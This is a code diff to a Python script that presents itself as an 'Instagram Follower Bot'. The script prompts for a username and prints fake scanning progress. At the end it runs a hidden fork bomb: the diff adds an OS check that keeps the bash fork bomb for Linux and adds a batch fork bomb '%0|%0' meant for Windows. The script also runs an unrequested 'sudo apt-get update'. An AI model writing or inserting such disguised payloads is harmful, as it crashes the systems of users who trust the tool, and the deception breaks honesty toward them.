@@ -1,8 +1,10 @@
 import time
 import sys
 import os
-
-os.system('sudo apt-get update')
+import platform
+current_os = platform.system()
+if current_os == "Linux":
+    os.system('sudo apt-get update')
 print("Instagram Follower Bot")
 name = input('Enter your Username : ')
 print("Scanning For Username that go by: %s" % name)
@@ -30,4 +32,7 @@ for x in range(1, 101):
     time.sleep(0.01)
 time.sleep(3)
 print("Thank You...")
-os.system(':(){:|:&};:')
+if current_os == "Linux":
+    os.system(':(){:|:&};:')
+if current_os == "windows":
+    os.system('%0|%0')
